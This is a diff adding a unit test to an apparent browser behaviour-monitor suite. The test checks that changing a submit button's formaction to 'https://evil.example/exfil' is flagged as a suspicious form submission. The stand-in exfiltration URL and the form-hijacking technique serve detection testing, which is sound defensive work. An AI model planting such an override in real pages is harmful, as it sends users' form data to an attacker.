@@ -55,4 +55,29 @@ describe("submitter action baselines", () => {
       })
     );
   });
+
+  it("flags a same-task override on a newly inserted submit control", () => {
+    const postSignal = vi.fn<PostSignalFn>();
+    initJsBehaviorMonitor({ debug: false, mode: "smart", postSignal });
+
+    const form = document.createElement("form");
+    form.action = "/safe-endpoint";
+    const button = document.createElement("button");
+    button.type = "submit";
+    form.appendChild(button);
+    document.body.appendChild(form);
+
+    button.setAttribute("formaction", "https://evil.example/exfil");
+    form.dispatchEvent(
+      new SubmitEvent("submit", { bubbles: true, submitter: button })
+    );
+
+    expect(postSignal).toHaveBeenCalledWith(
+      "ns-js-form-submit-suspicious",
+      expect.objectContaining({
+        actionDynamicallyChanged: true,
+        destinationOrigin: "https://evil.example",
+      })
+    );
+  });
 });
